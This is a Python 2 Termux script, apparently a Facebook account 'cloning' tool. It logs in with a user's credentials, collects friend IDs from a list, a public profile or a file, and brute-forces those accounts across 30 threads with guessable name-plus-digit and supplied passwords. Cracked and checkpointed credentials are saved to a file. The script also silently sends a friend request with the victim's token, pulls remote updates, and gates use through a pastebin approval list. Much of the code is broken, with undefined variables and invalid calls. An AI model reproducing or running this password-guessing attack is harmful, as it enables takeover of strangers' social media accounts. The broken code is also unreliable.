#!/usr/bin/python2
#coding=utf-8
#Codded By Jam marhaba
#Editing My Script Will Not Make You A Coder
#Facebook : JAM marhaba
#Whatsapp : ++971528752764
#Pakistan Cyber Expert
#Alone Coder 
try:
    import os
    import sys
    import time
    import datetime
    import re
    import threading
    import json
    import random
    import requests
    import hashlib
    import cookielib
    import uuid
    import getpass
    import mechanize
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system("pip2 install lolcat")
    os.system('python2 marhaba.py')
    __author__ = 'Mr.James'
    __copyright = 'All rights reserved . Copyright  Mr.James'
os.system('termux-setup-storage')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### INTRO #####
def logo():
    os.system('echo -e "\n\n\033[1;92m    .S Jutt Badshah        .SSS\n\033[1;92m   Jutt Badshah       SSSs\n\033[1;91m   Jutt Badshah      SSS%S\n\033[1;91m   Jutt Badshah S%S\n\033[1;97m   S&S  S%Sâ€¢SSSS%S  S%S   s..s   S%S\n\033[1;97m   S&S  Jutt Badshah    S&S\n\033[1;94m   Jutt Badshah         S&S\n\033[1;94m   Jutt Badshah  Jutt Badshah\n\033[1;93m   Jutt Badshah  S*S          S*S\n\033[1;93m  Jutt Badshah          S*S\n\033[1;96msdSSS   Jutt Badshah        S*S\n\033[1;96mYSSY    Jutt Badshah S*S\n\033[1;91m-----------------------------------------------\n\033[1;97mâž£ Author : Jutt Badshah x  ????\n\033[1;97mâž£ Github : https://github.com/jutt-badshah\n\033[1;97mâž£ Wp +923007574310\n\033[1;91m-----------------------------------------------" | lolcat')
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


def reg():
    os.system('clear')
    logo()
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://pastebin.com/raw/X081WEHs').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        logo()
        print '\tApproved Failed'
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ' \033[1;92mCopy token id and send to Jam marhaba'
        print ' \033[1;92mYour id: ' + to
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923053176060')
        reg()


def reg2():
    os.system('clear')
    logo()
    print '\tApproval not detected'
    print ' \033[1;92mCopy and press enter , And Send Me On +923053176060'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923053176060')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    logo()
    print '\tCollecting device info'
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\033[1;92m Your country: ' + country
    time.sleep(1)
    print '\033[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    methodlogin()

def methodlogin():
	try:
                 t_check = open('access_token.txt', 'r')
	except (KeyError, IOError):
	         os.system('clear')
	         logo()
	         print "[1] Login With ID/Password."
	         print "[2] Login Using Token."
	         print "[3] Exit."
	         print ('      ')
	         hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		logo()
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt', 'w')
		hopa.write(hosp)
		hopa.close()
		print "\n[âœ“] Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
		menu()
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()        

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
     	
		
		jalan(' \033[1;97m   âœ§ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
		jalan(' \033[1;97m   âœ§ \033[1;97mðŸ‘‰ : \033[1;97mJutt King Of Facebook' ) 
		
		print('	' )
		print('      \033[1;97m      âœ§ \x1b[1;97mLogin With Facebook\x1b[1;97m âœ§')
		print('	' )
		id = raw_input('\033[1;97mâœ§ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('\033[1;97mâœ§ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;97mSuccessfully Logged In'
				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;31mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;31mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;31mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;31mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:jam
	logo()
	print "  \033[1;97m        âš¡ \033[1;97mLogged in User Info\033[1;97m âš¡"
	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
	
	print "\033[1;97m---------------------------------------------------------"
		
	print "\033[1;97mâœ§\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
      
        
        print "\033[1;97mâœ§\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
        print "\033[1;97mâœ§\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
        hop()

def hop():
	hack = raw_input("\n\033[1;97mChoose Option â‰» \033[1;97m")
	if hack =="":
		print "\x1b[1;97mFill in correctly"
		hop()
	elif hack =="1":
		super()
	elif hack =="2":
	        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
	        menu()
        
	elif hack =="0":
		hamu('Token Removed')
		os.system('rm -rf login.txt')
		exit()
	else:
		print "\x1b[1;97mFill in correctly"
		hop()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;97mToken invalid"
		time.sleep(1)
		methodlogin()
	os.system('clear')
	logo()
	print "\033[1;97mâœ§ \033[1;97m1.\x1b[1;97mCrack From Friend List."
	print "\033[1;97mâœ§ \033[1;97m2.\x1b[1;97mCrack From Public ID."
	print "\033[1;97mâœ§ \033[1;97m3.\x1b[1;97mCrack From File."
	print "\033[1;97mâœ§ \033[1;97m0.\033[1;97mBack."
	pilih_super()

def pilih_super():
	id = []
        cps = []
        oks = []
	peak = raw_input("\n\033[1;97mChoose Option â‰» \033[1;97m")
	if peak =="":
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		logo()
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(' \033[1;92m[4]Password: ')
                pass5 = raw_input(' \033[1;92m[5]Password: ')
                pass6 = raw_input(' \033[1;92m[6]Password: ')
                pass7 = raw_input(' \033[1;92m[7]Password: ')
		print ' \033[1;92mCloning from: ' + z
		jalan('\033[1;97m[âœ”] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		logo()
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(' \033[1;92m[4]Password: ')
                pass5 = raw_input(' \033[1;92m[5]Password: ')
                pass6 = raw_input(' \033[1;92m[6]Password: ')
                pass7 = raw_input(' \033[1;92m[7]Password: ')
		idt = raw_input("\033[1;97mâ‰»\033[1;97mLink ID\033[1;37m: \033[1;97m")
		
		try:
			r = requests.get('https://graph.facebook.com/' + idt + '?access_token='+toket)
                        q = json.loads(r.text)
                        z = q['name']
			os.system('clear')
                        logo()
			print ' \033[1;92mCloning from: ' + z
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;97m[âœ”] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
		    uid = i['id']
                    na = i['name']
                    nm = na.rsplit(' ')[0]
                    id.append(uid + '|' + nm)
        elif peak =="3":
		os.system('clear')
	        logo()
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(' \033[;92m[3]Name + digit: ')
                pass5 = raw_input(' \033[1;92m[5]Password: ')
                pass6 = raw_input(' \033[1;92m[6]Password: ')
                pass7 = raw_input(' \033[1;92m[7]Password: ')
	        try:
	                idlist= raw_input('[+] File Name: ')
	                for line in open(idlist ,'r').readlines():
	                    id.append(line.strip())
	        except IOError:
	                print"[!] File Not Found."
	                raw_input('Press Enter To Back. ')
	                super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[âœ”] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[âœ”] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
        print"""
[!] To Stop Process Press CTRL Then Z
---------------------------------------------------------"""		
			
	def main(arg):
		global cekpoint,oks
		user = arg
		uid,name=user.split("|")
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Jam
		try:
			pass1 = name.lower() + p1
			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
		        q = json.load(data)
			if 'access_token' in q:
				print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass1	
					cek = open("out/checkpoint.txt", "a")
					cek.write(uid+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(uid+pass1)
				else:
					pass2 = name.lower() + p2
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						oks.append(uid+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(uid+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(uid+pass2)
						else:
							pass3 = name.lower() + p3
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								oks.append(uid+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass3	
									cek = open("out/checkpoint.txt", "a")
									cek.write(uid+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(uid+pass3)
								else:
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										oks.append(uid+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass4
											cek = open("out/Checkpoint.txt", "a")
											cek.write(uid+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(uid+pass4)
										else:
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												oks.append(uid+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass5	
													cek = open("out/checkpoint.txt", "a")
													cek.write(uid+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(uid+pass5)
												else:
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														oks.append(uid+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass6	
															cek = open("out/checkpoint.txt", "a")
															cek.write(uid+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(uid+pass6)
														else:
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[Successfull] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
																oks.append(uid+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;31;1m[Checkpoint] ' + uid + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(uid+pass7)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m---------------------------------------------------"
	
	print '\033[1;97mProcess Has Been Completed.'
	print"\033[1;97m-----------------"
	print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
	print "\033[1;97m---------------------------------------------------"
	
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	reg()
